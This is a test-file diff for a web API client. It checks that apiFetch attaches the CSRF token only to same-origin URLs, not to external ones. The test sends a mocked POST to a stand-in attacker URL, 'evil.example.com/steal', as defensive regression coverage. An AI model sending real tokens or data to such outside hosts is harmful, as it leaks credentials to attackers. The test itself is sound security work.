@@ -184,3 +184,35 @@ describe("api client set-cookie forwarding", () => {
     expect(seen.length).toBe(2);
   });
 });
+
+describe("hunting round 2: apiFetch stays same-origin with the token", () => {
+  // the token authenticates THIS app's proxy: app code passing an absolute
+  // external url was shipping the csrf token to that origin (measured)
+  test("an external absolute url gets no csrf header", async () => {
+    const { apiFetch, CSRF_HEADER, CSRF_COOKIE } = await import("../src/index");
+    const g = globalThis as Record<string, unknown>;
+    const savedFetch = g.fetch;
+    const savedLoc = g.location;
+    const savedDoc = g.document;
+    try {
+      g.location = { origin: "http://app.test" };
+      g.document = { cookie: `${CSRF_COOKIE}=tok123` };
+      const seen: Request[] = [];
+      g.fetch = async (r: Request) => {
+        seen.push(r);
+        return new Response("ok");
+      };
+      await apiFetch("http://evil.example.com/steal", { method: "POST" });
+      expect(seen[0].headers.get(CSRF_HEADER)).toBeNull();
+      await apiFetch("http://app.test/api/x", { method: "POST" });
+      expect(seen[1].headers.get(CSRF_HEADER)).toBe("tok123");
+      // relative urls resolve against the page: same origin, token attached
+      await apiFetch(new Request("http://app.test/api/y", { method: "DELETE" }));
+      expect(seen[2].headers.get(CSRF_HEADER)).toBe("tok123");
+    } finally {
+      g.fetch = savedFetch;
+      g.location = savedLoc;
+      g.document = savedDoc;
+    }
+  });
+});
